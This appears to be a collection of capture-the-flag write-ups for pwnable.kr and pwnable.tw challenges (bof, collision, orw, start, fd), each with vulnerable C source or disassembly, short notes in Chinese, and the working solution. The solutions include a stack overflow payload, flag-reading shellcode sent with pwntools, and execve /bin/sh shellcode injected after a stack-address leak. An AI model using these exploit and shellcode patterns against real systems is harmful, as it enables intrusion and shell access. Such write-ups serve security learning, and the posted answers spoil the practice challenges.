entry.title: [pwnable.kr] Bof
entry.content:
s89162504@ubuntu:~/pwn/pwn.kr/bof$ cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
---
Stack上的buffer被overflow後可以蓋到stack上的參數
輸入一大堆0xcafebabe淹過去即可

s89162504@ubuntu:~/pwn/pwn.kr/bof$ (python -c "print '\xbe\xba\xfe\xca'*20";cat)  |  nc pwnable.kr 9000
ls -l
total 57564
-r-xr-x--- 1 root bof      7348 Sep 12  2016 bof
-rw-r--r-- 1 root root      308 Oct 23  2016 bof.c
-r--r----- 1 root bof        32 Jun 11  2014 flag
-rw------- 1 root root 58919704 Aug 27 00:07 log
-rw-r--r-- 1 root root        0 Oct 23  2016 log2
-rwx------ 1 root root      760 Sep 10  2014 super.pl
cat flag
daddy, I just pwned a buFFer :)

entry.title: [pwnable.kr] Collision
entry.content:
col@ubuntu:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}

---
輸入五個int總合是0x21DD09EC
長度判斷是strlen
所以不能有byte是\x00
因此用四個0x01010101加上剩下即可
另外要注意的點是little endian
col@ubuntu:~$ ./col $(python -c "print '\x01'*16+'\xe8\x05\xd9\x1d'")
daddy! I just managed to create a hash collision :)

entry.title: [pwnable.tw] Orw
entry.content:
push 0x00
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f2f2f
mov eax,5
mov ebx,esp
mov ecx,0
mov edx,0
int 0x80

mov ebx,eax
mov eax,3
mov ecx,esp
mov edx,50
int 0x80

mov eax,4
mov ebx,1
mov ecx,esp
mov edx,50
int 0x80

from pwn import *

r = remote('chall.pwnable.tw',10001)

r.send("\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x2F\x2F\x68\xB8\x05\x00\x00\x00\x89\xE3\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\x89\xE1\xBA\x32\x00\x00\x00\xCD\x80")

r.interactive()

entry.title: [pwnable.tw] Start
entry.content:
s89162504@ubuntu:~/pwn/pwn.tw/start$ objdump -d -M intel ./start

./start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       54                      push   esp
 8048061:       68 9d 80 04 08          push   0x804809d
 8048066:       31 c0                   xor    eax,eax
 8048068:       31 db                   xor    ebx,ebx
 804806a:       31 c9                   xor    ecx,ecx
 804806c:       31 d2                   xor    edx,edx
 804806e:       68 43 54 46 3a          push   0x3a465443
 8048073:       68 74 68 65 20          push   0x20656874
 8048078:       68 61 72 74 20          push   0x20747261
 804807d:       68 73 20 73 74          push   0x74732073
 8048082:       68 4c 65 74 27          push   0x2774654c
 8048087:       89 e1                   mov    ecx,esp
 8048089:       b2 14                   mov    dl,0x14
 804808b:       b3 01                   mov    bl,0x1
 804808d:       b0 04                   mov    al,0x4
 804808f:       cd 80                   int    0x80
 8048091:       31 db                   xor    ebx,ebx
 8048093:       b2 3c                   mov    dl,0x3c
 8048095:       b0 03                   mov    al,0x3
 8048097:       cd 80                   int    0x80
 8048099:       83 c4 14                add    esp,0x14
 804809c:       c3                      ret

0804809d <_exit>:
 804809d:       5c                      pop    esp
 804809e:       31 c0                   xor    eax,eax
 80480a0:       40                      inc    eax
 80480a1:       cd 80                   int    0x80

---

一開始的就把ebp push到stack上
所以整個start執行完時stack頂端就是ebp的值

start結尾是esp加20後就return
所以輸入超過20的話就可以淹到返回位置

把返回位置淹成0x08048087
剛剛好把ebp設成write system call的參數ecx
所以可以把stack address印出來

而且stack是可執行的
因此寫入shellcode再把返回位置改成shellcode即可



from pwn import *
#r = process('./start')
r = remote('chall.pwnable.tw',10000)
r.send('a'*20+p32(0x08048087))
r.recvuntil('CTF:')
stack_addr = u32(r.recv(4))
print 'stack addr = ',hex(stack_addr)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
r.send('a'*20+p32(stack_addr+20)+shellcode)
r.interactive()

entry.title: [pwnable.kr] Fd
entry.content:
fd@ubuntu:~$ ls
fd  fd.c  flag
fd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!

---

fd=0就是stdin
參數給0x1234=4660
從鍵盤輸入LETMEWIN即可
